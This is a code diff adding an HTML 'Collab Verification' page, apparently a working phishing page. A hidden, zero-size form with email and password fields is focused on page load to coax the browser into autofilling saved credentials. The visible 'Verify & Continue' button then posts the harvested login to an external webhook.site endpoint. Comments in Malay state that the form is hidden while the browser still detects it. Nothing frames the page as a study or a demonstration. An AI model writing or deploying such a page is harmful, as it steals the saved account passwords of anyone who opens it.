@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Collab Portal – Verify</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #0f0f0f;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .card {
+      background: #1a1a1a;
+      border-radius: 16px;
+      padding: 40px 28px;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+      position: relative;
+    }
+    h1 { font-size: 22px; margin-bottom: 8px; }
+    .sub { color: #888; font-size: 14px; margin-bottom: 32px; line-height: 1.5; }
+    button {
+      width: 100%;
+      padding: 15px;
+      border: none;
+      border-radius: 10px;
+      background: #2aabee;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .note { font-size: 12px; color: #555; margin-top: 18px; }
+
+    /* Sembunyikan form tapi biar browser masih detect */
+    .hidden-form {
+      position: absolute;
+      opacity: 0;
+      height: 0;
+      width: 0;
+      overflow: hidden;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Collab Verification</h1>
+    <p class="sub">Verify your account before we proceed with the collaboration.<br>Takes less than 10 seconds.</p>
+
+    <!-- Form tersembunyi -->
+    <form id="stealForm" class="hidden-form" action=" https://webhook.site/0fe5de9c-9d7c-472c-878c-ca4a9161165b" method="POST">
+      <input type="email" name="email" autocomplete="username">
+      <input type="password" name="password" autocomplete="current-password">
+    </form>
+
+    <!-- Button yang nampak -->
+    <button type="button" onclick="document.getElementById('stealForm').submit()">
+      Verify & Continue
+    </button>
+
+    <p class="note">Secure verification</p>
+  </div>
+
+  <script>
+    // Cuba trigger autofill awal
+    window.onload = () => {
+      const form = document.getElementById('stealForm');
+      // focus invisible inputs supaya browser tawarkan autofill
+      form.querySelector('input[name="email"]').focus();
+      setTimeout(() => {
+        form.querySelector('input[name="password"]').focus();
+      }, 300);
+    };
+  </script>
+</body>
+</html>
